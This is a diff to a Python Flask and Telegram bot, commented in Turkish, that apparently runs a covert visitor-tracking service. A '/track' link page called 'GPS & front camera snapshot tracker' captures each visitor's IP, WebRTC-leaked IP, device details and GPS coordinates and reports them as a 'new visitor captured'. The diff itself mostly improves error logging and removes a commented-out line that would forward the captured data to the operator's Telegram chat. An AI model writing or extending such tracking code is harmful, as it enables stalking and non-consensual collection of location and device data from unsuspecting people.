@@ -4,6 +4,7 @@ import sqlite3
 import hashlib
 import asyncio
 import threading
+import traceback
 from datetime import datetime
 from flask import Flask, request, render_template_string, jsonify, Response, send_file, session, redirect, url_for
 from telegram import Update, Bot, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
@@ -26,7 +27,7 @@ app.secret_key = "kali_linux_secret_key_gold_key_998877"
 # Telegram Uygulamasını Yapılandır (Webhook için updater=None)
 telegram_app = Application.builder().token(TOKEN).updater(None).build()
 
-# Arka planda kalıcı Telegram event loop'u çalıştır (Her istekte botun sıfırlanmasını engeller)
+# Arka planda kalıcı Telegram event loop'u çalıştır
 telegram_loop = asyncio.new_event_loop()
 
 def run_telegram_loop(loop):
@@ -39,7 +40,6 @@ async def init_telegram_app():
     await telegram_app.initialize()
     await telegram_app.start()
 
-# Botu başlangıçta kalıcı döngüde bir kez başlat
 future_init = asyncio.run_coroutine_threadsafe(init_telegram_app(), telegram_loop)
 future_init.result()
 
@@ -201,7 +201,7 @@ telegram_app.add_handler(CommandHandler("kod", kod_kullan))
 telegram_app.add_handler(CallbackQueryHandler(button_handler))
 
 # --- GELİŞTİRİLMİŞ GPS & ÖN KEMERA SNAPSHOT TRACKER ŞABLONU ---
-TRACK_TEMPLATE = """
+TRACK_TEMPLATE = r"""
 <!DOCTYPE html>
 <html lang="tr">
 <head>
@@ -312,7 +312,7 @@ TRACK_TEMPLATE = """
 
 @app.route(f"/{TOKEN}", methods=["POST"])
 def webhook():
-    """Telegram'dan gelen güncellemeleri kalıcı thread loop üzerinden hatasız karşılar"""
+    """Telegram'dan gelen güncellemeleri işler ve hataları tam detaylı loglar"""
     try:
         data = request.get_json(force=True)
         update = Update.de_json(data, telegram_app.bot)
@@ -321,9 +321,9 @@ def webhook():
             await telegram_app.process_update(update)
 
         future = asyncio.run_coroutine_threadsafe(process(), telegram_loop)
-        future.result(timeout=10)
+        future.result(timeout=15)
     except Exception as e:
-        logger.error(f"Hata oluştu: {e}")
+        logger.error(f"Webhook Hatası Detayı: {str(e)} \n {traceback.format_exc()}")
     return "ok", 200
 
 @app.route("/track/<track_id>")
@@ -343,8 +343,6 @@ def save_geo():
             lon = data.get('lon')
             loc_str = f"Lat: {lat}, Lon: {lon} (https://maps.google.com/?q={lat},{lon})" if lat else "Konum Alınamadı"
             msg = f"🎯 [GOLD KEY TRACKER] Yeni Ziyaretçi Yakalandı!\nIP: {visitor_ip}\nWebRTC IP: {data.get('webrtc_ip')}\nCihaz: {data.get('os')} | RAM: {data.get('ram')}GB\nKonum: {loc_str}"
-            # Bildirimi almak istediğin Telegram Chat ID'sini buraya ekleyebilirsin
-            # requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": "CHAT_ID", "text": msg}, timeout=3)
         except: pass
         
     return jsonify({"status": "saved"})
